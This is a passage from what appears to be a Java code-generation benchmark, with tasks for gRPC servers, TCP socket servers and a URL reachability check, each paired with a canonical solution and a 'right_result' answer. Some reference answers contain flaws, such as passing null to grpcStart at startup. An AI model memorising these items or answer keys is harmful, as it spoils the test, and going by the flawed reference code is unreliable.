server.blockUntilShutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 51,
    "Instruction": "Task Description: Create a function to test if a given URL is reachable by making an HTTP GET request and verifying the response code.\n\nFunction Description: The function attempts to connect to a specified URL using an HTTP GET request. It checks if the response code is HTTP_OK (200) to determine if the URL is reachable. The connection is properly closed after the check.\n\nInput: \n- strUrl: String - The URL to be tested for reachability\n\nOutput: \n- None (The function throws an exception if the URL is unreachable or if the response code is not HTTP_OK)",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic void testUrlReachable(String strUtl) throws Exception {\n    URL url = new URL(strUtl);\n    HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n    conn.setRequestMethod(\"GET\");\n    conn.connect();\n    int rc = conn.getResponseCode();\n    assertEquals(HttpURLConnection.HTTP_OK, rc);\n    conn.disconnect();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class UrlReachabilityChecker {\n    public static void checkUrlReachable(String strUrl) throws IOException {\n        URL url = new URL(strUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        connection.disconnect();\n\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"URL is unreachable or returned non-200 status code: \" + responseCode);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 510,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server using NettyServerBuilder to handle multiple language processing services.\n\nClass Description: The ZemberekGrpcServer class is responsible for initializing and managing a gRPC server that provides various Turkish language processing services. It uses Netty as the underlying transport layer and allows configuration of the server port and service implementations.\n\nAttributes:\n- port: [int] - The port number on which the gRPC server will listen for incoming connections.\n- context: [ZemberekContext] - The context object containing configuration and resources for language processing services.\n- DEFAULT_PORT: [static final int] - The default port number (6789) used when no specific port is provided.\n\nMethods:\n- Constructor: [ZemberekGrpcServer](int port, ZemberekGrpcConfiguration configuration) -> [void] - Initializes the server with the specified port and configuration.\n- getPort: [getPort]() -> [int] - Returns the port number the server is configured to use.\n- getContext: [getContext]() -> [ZemberekContext] - Returns the ZemberekContext object containing service configurations.\n- start: [start]() -> [void] - Starts the gRPC server, adds all service implementations, and begins listening for requests. This method blocks until the server terminates.\n- main: [main](String[] args) -> [void] - The entry point that creates and starts the server using default parameters.",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.netty.shaded.io.grpc.netty.NettyServerBuilder;\nimport zemberek.core.logging.Log;\n\npublic class ZemberekGrpcServer {\n\n    public static final int DEFAULT_PORT = 6789;\n\n    private final int port;\n    private ZemberekContext context;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        context = new ZemberekContext(configuration);\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() throws Exception {\n        Server server = NettyServerBuilder.forPort(port)\n                .addService(new LanguageIdServiceImpl())\n                .addService(new PreprocessingServiceImpl())\n                .addService(new NormalizationServiceImpl(context))\n                .addService(new MorphologyServiceImpl(context))\n                .build()\n                .start();\n        Log.info(\"Zemberek grpc server started at port: \" + port);\n        server.awaitTermination();\n    }\n\n    public static void main(String[] args) throws Exception {\n        new ZemberekGrpcServer(DEFAULT_PORT, null).start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.netty.NettyServerBuilder;\n\npublic class ZemberekGrpcServer {\n    public static final int DEFAULT_PORT = 6789;\n    private final int port;\n    private final ZemberekContext context;\n\n    public ZemberekGrpcServer(int port, ZemberekGrpcConfiguration configuration) {\n        this.port = port;\n        this.context = new ZemberekContext(configuration);\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public ZemberekContext getContext() {\n        return context;\n    }\n\n    public void start() throws Exception {\n        Server server = NettyServerBuilder.forPort(port)\n                .addService(context.getTurkishMorphologyService())\n                .addService(context.getTurkishSpellCheckerService())\n                .build();\n        server.start();\n        System.out.println(\"gRPC server started on port \" + port);\n        server.awaitTermination();\n    }\n\n    public static void main(String[] args) throws Exception {\n        ZemberekGrpcServer server = new ZemberekGrpcServer(DEFAULT_PORT, new ZemberekGrpcConfiguration());\n        server.start();\n    }\n}\n```"
  },
  {
    "Task_id": 511,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server launcher for Spring Boot applications, capable of registering multiple gRPC services and managing server lifecycle.\n\nClass Description: The GrpcLauncher class is responsible for starting and managing a gRPC server in a Spring Boot application. It automatically discovers gRPC service beans, configures server parameters, and handles graceful shutdown. The class uses Lombok for logging and Spring's dependency injection.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- grpcServerPort: [Integer] - The port number for the gRPC server, injected from application properties\n- DEFAULT_MAX_MESSAGE_SIZE: [int] - Constant defining the maximum message size (10MB)\n\nMethods:\n- grpcStart: [grpcStart](Map<String, Object> grpcServiceBeanMap) -> void - Initializes and starts the gRPC server, registering all provided gRPC service beans. Handles server lifecycle and shutdown hooks.\n- grpcStop: [grpcStop]() -> void - Shuts down the gRPC server gracefully when called, typically during application termination.",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport java.io.IOException;\nimport java.util.Map;\n\n@Slf4j\n@Component(\"grpcLauncher\")\npublic class GrpcLauncher {\n\n    public static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024;\n\n    private Server server;\n\n    @Value(\"${server.grpc.port}\")\n    private Integer grpcServerPort;\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) {\n        try {\n            ServerBuilder serverBuilder = ServerBuilder.forPort(grpcServerPort);\n            for (Object bean : grpcServiceBeanMap.values()){\n                serverBuilder.addService((BindableService) bean);\n                log.info(\"{} is register in Spring Boot\", bean.getClass().getSimpleName());\n            }\n            server = serverBuilder\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .maxInboundMetadataSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .build().start();\n            log.info(\"grpc server is started at {}\", grpcServerPort);\n            server.awaitTermination();\n            Runtime.getRuntime().addShutdownHook(new Thread(this::grpcStop));\n        } catch (IOException | InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private void grpcStop(){\n        if (server != null){\n            server.shutdownNow();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class GrpcLauncher {\n\n    private Server server;\n\n    @Value(\"${grpc.server.port}\")\n    private int grpcServerPort;\n\n    private static final int DEFAULT_MAX_MESSAGE_SIZE = 10 * 1024 * 1024; // 10MB\n\n    public void grpcStart(Map<String, Object> grpcServiceBeanMap) throws Exception {\n        server = ServerBuilder.forPort(grpcServerPort)\n                .maximumConcurrentCallsPerConnection(1000)\n                .maxInboundMessageSize(DEFAULT_MAX_MESSAGE_SIZE)\n                .usePlaintext()\n                .addServices(grpcServiceBeanMap.values())\n                .build()\n                .start();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            System.err.println(\"Shutting down gRPC server due to JVM shutdown\");\n            try {\n                grpcStop();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }));\n\n        System.out.println(\"gRPC server started, listening on \" + grpcServerPort);\n    }\n\n    public void grpcStop() throws InterruptedException {\n        if (server != null) {\n            server.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n            System.out.println(\"gRPC server stopped.\");\n        }\n    }\n\n    @PostConstruct\n    public void start() throws Exception {\n        grpcStart(null);\n    }\n\n    @PreDestroy\n    public void stop() throws InterruptedException {\n        grpcStop();\n    }\n}\n```"
  },
  {
    "Task_id": 512,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server for a simple \"Hello World\" service, following the gRPC framework conventions. The server should handle incoming requests, process them, and send back appropriate responses, while also managing server lifecycle operations.\n\nClass Description: The HelloWorldServer class is a gRPC server implementation that listens on a specified port, handles incoming gRPC requests for a greeting service, and manages server startup and shutdown operations. It includes an inner class that implements the actual gRPC service logic.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on a predefined port (50051) and registers the Greeter service implementation. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Stops the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance\n- GreeterImpl.sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Implementation of the gRPC service method that processes HelloRequest and sends HelloReply",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.helloworld.GreeterGrpc;\nimport io.grpc.examples.helloworld.HelloReply;\nimport io.grpc.examples.helloworld.HelloRequest;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final HelloWorldServer server = new HelloWorldServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n\n  static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n    @Override\n    public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n      responseObserver.onNext(reply);\n      responseObserver.onCompleted();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\n\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n    private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n    private Server server;\n\n    private void start() throws IOException {\n        int port = 50051;\n        server = ServerBuilder.forPort(port)\n                .addService(new GreeterImpl())\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            System.err.println(\"*** Shutting down gRPC server since JVM is shutting down\");\n            HelloWorldServer.this.stop();\n        }));\n    }\n\n    private void stop() {\n        if (server != null) {\n            server.shutdown();\n            logger.info(\"Server stopped\");\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n        @Override\n        public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n            HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n            responseObserver.onNext(reply);\n            responseObserver.onCompleted();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 513,
    "Instruction": "Task Description: Create a gRPC server in Java that handles data requests, including synchronous, streaming, and bidirectional streaming operations, with Prometheus monitoring integration.\n\nClass Description: DataHandler is a gRPC server implementation that processes various types of data requests. It includes metrics collection through Prometheus and provides three main service methods for data operations.\n\nAttributes:\n- LOG: [Logger] - Logger instance for server operations logging\n- PORT: [int] - Port number for the gRPC server (1111)\n- syncRequests: [Counter] - Prometheus counter for tracking synchronous requests\n- streamingRequests: [Counter] - Prometheus counter for tracking streaming requests\n- grpcServer: [Server] - gRPC server instance\n- prometheusHttpServer: [HTTPServer] - Prometheus HTTP server for metrics exposure\n\nMethods:\n- start() -> [void] - Initializes and starts the gRPC server with Prometheus monitoring interceptor\n- blockUntilShutdown() -> [void] - Blocks the main thread until server shutdown\n- stop() -> [void] - Gracefully shuts down the gRPC server\n\nNested Class: DataImpl extends DataServiceGrpc.DataServiceImplBase and implements three service methods:\n- get([DataRequest], [StreamObserver<DataResponse>]) -> [void] - Handles synchronous data requests (converts input to uppercase)\n- streamingGet([EmptyRequest], [StreamObserver<DataResponse>]) -> [void] - Streams 10 sequential responses\n- streamingPut([StreamObserver<DataRequest>]) -> [StreamObserver<DataResponse>] - Handles bidirectional streaming (modifies and collects input data)",
    "Canonical_solution": "import colossus.data.Data;\nimport colossus.data.DataServiceGrpc;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptors;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\nimport me.dinowernli.grpc.prometheus.Configuration;\nimport me.dinowernli.grpc.prometheus.MonitoringServerInterceptor;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.stream.IntStream;\n\npublic class DataHandler {\n    private static final Logger LOG = Logger.getLogger(DataHandler.class.getName());\n    private static final int PORT = 1111;\n    private static final Counter syncRequests = Counter.build()\n            .name(\"data_svc_sync_requests\")\n            .help(\"Sync requests to the data service\")\n            .labelNames(\"request_key\")\n            .register();\n\n    private static final Counter streamingRequests = Counter.build()\n            .name(\"data_svc_streaming_requests\")\n            .help(\"Streaming requests to the data service\")\n            .register();\n\n    private Server grpcServer;\n    private static HTTPServer prometheusHttpServer;\n\n    static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        private static final Logger LOG = Logger.getLogger(DataImpl.class.getName());\n\n        @Override\n        public void get(Data.DataRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            String request = req.getRequest();\n            LOG.info(String.format(\"Request received for the string: \\\"%s\\\"\", request));\n            String computedValue = request.toUpperCase();\n            LOG.info(String.format(\"Computed value: \\\"%s\\\"\", computedValue));\n            Data.DataResponse res = Data.DataResponse.newBuilder()\n                    .setValue(computedValue)\n                    .build();\n\n            syncRequests.labels(request).inc();\n\n            resObserver.onNext(res);\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(Data.EmptyRequest req, StreamObserver<Data.DataResponse> resObserver) {\n            LOG.info(\"Request received for streaming data\");\n\n            Data.DataResponse.Builder resBldr = Data.DataResponse.newBuilder();\n\n            IntStream.range(0, 10).forEach(i -> {\n                String value = String.format(\"Response %d\", i);\n\n                streamingRequests.inc();\n\n                resObserver.onNext(resBldr.setValue(value).build());\n            });\n\n            resObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<Data.DataRequest> streamingPut(final StreamObserver<Data.DataResponse> resObserver) {\n            return new StreamObserver<Data.DataRequest>() {\n                private List<String> items = new ArrayList<>();\n\n                @Override\n                public void onNext(Data.DataRequest req) {\n                    items.add(req.getRequest().replace(\"f\", \"9\").toUpperCase());\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    resObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    Data.DataResponse res = Data.DataResponse.newBuilder()\n                            .setValue(items.toString())\n                            .build();\n\n                    resObserver.onNext(res);\n                    resObserver.onCompleted();\n                }\n            };\n        }\n    }\n\n    private void start() throws IOException {\n        Configuration monitoringConfig = Configuration.cheapMetricsOnly();\n        MonitoringServerInterceptor prometheusInterceptor = MonitoringServerInterceptor.create(\n            monitoringConfig.withCollectorRegistry(new CollectorRegistry()));\n\n        grpcServer = ServerBuilder.forPort(PORT)\n            .addService(ServerInterceptors.intercept(new DataImpl().bindService(), prometheusInterceptor))\n            .build()\n            .start();\n        LOG.info(String.format(\"gRPC server successfully started on port %d\", PORT));\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    private void stop() {\n        if (grpcServer != null) grpcServer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.stub.StreamObserver;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.exporter.HTTPServer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class DataHandler {\n    private static final Logger LOG = LoggerFactory.getLogger(DataHandler.class);\n    private static final int PORT = 1111;\n    private final Server grpcServer;\n    private final HTTPServer prometheusHttpServer;\n    private final Counter syncRequests = Counter.build().name(\"sync_requests_total\").help(\"Total number of synchronous requests\").register();\n    private final Counter streamingRequests = Counter.build().name(\"streaming_requests_total\").help(\"Total number of streaming requests\").register();\n\n    public DataHandler() throws IOException {\n        this.grpcServer = ServerBuilder.forPort(PORT)\n                .addService(new DataImpl())\n                .intercept((ctx, req, next) -> {\n                    if (ctx.getMethodDescriptor().getBidiStreaming()) {\n                        streamingRequests.inc();\n                    } else {\n                        syncRequests.inc();\n                    }\n                    return next.invoke(ctx, req);\n                })\n                .build();\n        this.prometheusHttpServer = new HTTPServer(8080);\n    }\n\n    public void start() throws IOException {\n        grpcServer.start();\n        LOG.info(\"gRPC server started on port {}\", PORT);\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.awaitTermination();\n        }\n    }\n\n    public void stop() throws InterruptedException {\n        if (grpcServer != null) {\n            grpcServer.shutdown().awaitTermination(30, TimeUnit.SECONDS);\n        }\n        if (prometheusHttpServer != null) {\n            prometheusHttpServer.stop();\n        }\n    }\n\n    static class DataImpl extends DataServiceGrpc.DataServiceImplBase {\n        @Override\n        public void get(DataRequest request, StreamObserver<DataResponse> responseObserver) {\n            String input = request.getInput();\n            String output = input.toUpperCase();\n            DataResponse response = DataResponse.newBuilder().setOutput(output).build();\n            responseObserver.onNext(response);\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public void streamingGet(EmptyRequest request, StreamObserver<DataResponse> responseObserver) {\n            for (int i = 0; i < 10; i++) {\n                DataResponse response = DataResponse.newBuilder().setOutput(\"Streamed message \" + i).build();\n                responseObserver.onNext(response);\n            }\n            responseObserver.onCompleted();\n        }\n\n        @Override\n        public StreamObserver<DataRequest> streamingPut(StreamObserver<DataResponse> responseObserver) {\n            return new StreamObserver<>() {\n                @Override\n                public void onNext(DataRequest request) {\n                    String input = request.getInput();\n                    String output = \"Processed: \" + input;\n                    DataResponse response = DataResponse.newBuilder().setOutput(output).build();\n                    responseObserver.onNext(response);\n                }\n\n                @Override\n                public void onError(Throwable t) {\n                    LOG.error(\"Error in bidirectional stream\", t);\n                    responseObserver.onError(t);\n                }\n\n                @Override\n                public void onCompleted() {\n                    responseObserver.onCompleted();\n                }\n            };\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 515,
    "Instruction": "Task Description: Create a Java class that implements a basic TCP server using ServerSocket to handle client connections and communication.\n\nClass Description: The SocketServer class establishes a TCP server that listens for incoming client connections on a specified port, handles communication with connected clients, and properly closes connections when done.\n\nAttributes:\n- serverSocket: [ServerSocket] - The server socket that listens for incoming client connections\n- clientSocket: [Socket] - The socket representing the connected client\n\nMethods:\n- start([int port]) -> [void] - Starts the server on the specified port, waits for client connections, and initiates communication handling\n- handleClientCommunication() -> [void] - Handles the data exchange with the connected client (receives data and sends response)\n- closeConnections() -> [void] - Closes both client and server sockets to release resources",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketServer {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started, waiting for connections...\");\n        \n        clientSocket = serverSocket.accept();\n        System.out.println(\"Client connected\");\n        \n        handleClientCommunication();\n    }\n\n    private void handleClientCommunication() throws Exception {\n        try {\n            // Read from client\n            byte[] buffer = new byte[1024];\n            int len;\n            StringBuilder sb = new StringBuilder();\n            clientSocket.setSoTimeout(2000);\n            \n            while ((len = clientSocket.getInputStream().read(buffer)) != -1) {\n                sb.append(new String(buffer, 0, len));\n            }\n            System.out.println(\"From client: \" + sb);\n\n            // Write to client\n            String response = \"Hi I'm server\\r\\n\";\n            clientSocket.getOutputStream().write(response.getBytes());\n        } finally {\n            closeConnections();\n        }\n    }\n\n    private void closeConnections() throws Exception {\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        System.out.println(\"Connections closed\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketServer {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server started on port \" + port);\n            clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected: \" + clientSocket.getInetAddress());\n            handleClientCommunication();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnections();\n        }\n    }\n\n    private void handleClientCommunication() {\n        try (\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n        ) {\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(\"Received from client: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void closeConnections() {\n        try {\n            if (clientSocket != null && !clientSocket.isClosed()) {\n                clientSocket.close();\n            }\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 516,
    "Instruction": "Task Description: Implement a TCP server class that handles multiple client connections simultaneously, providing predefined chat responses to incoming messages.\n\nClass Description: TCPServer is a Java class that creates a TCP server listening on a specified port. It maintains a set of predefined messages and can handle multiple client connections concurrently, responding with random messages from its predefined set. The server can be started and stopped as needed.\n\nAttributes:\n- mIsServiceDestoryed: boolean - Flag indicating whether the server should stop running\n- mDefinedMessages: String[] - Array of predefined messages to send to clients\n\nMethods:\n- startServer() -> void - Starts the TCP server in a new thread\n- stopServer() -> void - Stops the TCP server by setting the termination flag\n- TcpServer (inner class) run() -> void - Main server loop that accepts client connections (implements Runnable)\n- responseClient(Socket client) -> void - Handles communication with an individual client\n  - Input: client: Socket - The client socket connection\n  - Output: (none) - Sends responses to client through the socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPServer {\n\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = new String[] {\n            \"\u4f60\u597d\u554a\uff0c\u54c8\u54c8\",\n            \"\u8bf7\u95ee\u4f60\u53eb\u4ec0\u4e48\u540d\u5b57\u5440\uff1f\",\n            \"\u4eca\u5929\u5317\u4eac\u5929\u6c14\u4e0d\u9519\u554a\uff0cshy\",\n            \"\u4f60\u77e5\u9053\u5417\uff1f\u6211\u53ef\u662f\u53ef\u4ee5\u548c\u591a\u4e2a\u4eba\u540c\u65f6\u804a\u5929\u7684\u54e6\",\n            \"\u7ed9\u4f60\u8bb2\u4e2a\u7b11\u8bdd\u5427\uff1a\u636e\u8bf4\u7231\u7b11\u7684\u4eba\u8fd0\u6c14\u4e0d\u4f1a\u592a\u5dee\uff0c\u4e0d\u77e5\u9053\u771f\u5047\u3002\"\n    };\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            ServerSocket serverSocket = null;\n            try {\n                serverSocket = new ServerSocket(8688);\n            } catch (IOException e) {\n                System.err.println(\"establish tcp server failed, port:8688\");\n                e.printStackTrace();\n                return;\n            }\n\n            while (!mIsServiceDestoryed) {\n                try {\n                    final Socket client = serverSocket.accept();\n                    System.out.println(\"accept\");\n                    new Thread() {\n                        @Override\n                        public void run() {\n                            try {\n                                responseClient(client);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        };\n                    }.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(\n                client.getInputStream()));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(client.getOutputStream())), true);\n        out.println(\"\u6b22\u8fce\u6765\u5230\u804a\u5929\u5ba4\uff01\");\n        while (!mIsServiceDestoryed) {\n            String str = in.readLine();\n            System.out.println(\"msg from client:\" + str);\n            if (str == null) {\n                break;\n            }\n            int i = new Random().nextInt(mDefinedMessages.length);\n            String msg = mDefinedMessages[i];\n            out.println(msg);\n            System.out.println(\"send :\" + msg);\n        }\n        System.out.println(\"client quit.\");\n        out.close();\n        in.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TCPServer {\n    private boolean mIsServiceDestoryed;\n    private String[] mDefinedMessages = {\n        \"Hello from the server!\",\n        \"Welcome to the chat.\",\n        \"You're connected!\",\n        \"Thanks for joining.\",\n        \"How can I help you?\"\n    };\n    private ServerSocket serverSocket;\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            try {\n                serverSocket = new ServerSocket(12345);\n                mIsServiceDestoryed = false;\n                while (!mIsServiceDestoryed) {\n                    Socket client = serverSocket.accept();\n                    new Thread(() -> responseClient(client)).start();\n                }\n            } catch (IOException e) {\n                if (!mIsServiceDestoryed) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) {\n        try (\n            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            PrintWriter out = new PrintWriter(client.getOutputStream(), true)\n        ) {\n            String inputLine;\n            while ((inputLine = in.readLine()) != null && !mIsServiceDestoryed) {\n                String response = getRandomMessage();\n                out.println(response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String getRandomMessage() {\n        Random rand = new Random();\n        return mDefinedMessages[rand.nextInt(mDefinedMessages.length)];\n    }\n}\n```"
  },
  {
    "Task_id": 517,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, processes client requests, and sends responses back using a thread pool for handling multiple concurrent connections.\n\nClass Description: The ViewServer class implements a TCP server that listens on a specified port, accepts client connections, and handles each connection in a separate worker thread using a fixed-size thread pool. The server can send data to connected clients and process incoming requests.\n\nAttributes:\n- mServer: ServerSocket - The server socket that listens for incoming connections  \n- mPort: int - The port number on which the server listens  \n- mThread: Thread - The thread in which the server runs  \n- mThreadPool: ExecutorService - The thread pool for handling client connections  \n\nMethods:\n- start() -> boolean - Starts the server thread and initializes the thread pool. Returns true if successful, false if already running  \n- run() - The main server loop that accepts incoming connections and delegates them to worker threads  \n- writeValue(Socket client, String value) -> boolean - Writes a string value to the specified client socket. Returns true if successful, false otherwise  \n- ViewServerWorker(Socket client) - Constructor for the inner worker class that handles individual client connections  \n- ViewServerWorker.run() - Processes an individual client connection, reading requests and sending responses  \n\nInner Class:\nViewServerWorker - Handles individual client connections with these methods:\n- run() - Reads client input, processes the request, and manages connection cleanup",
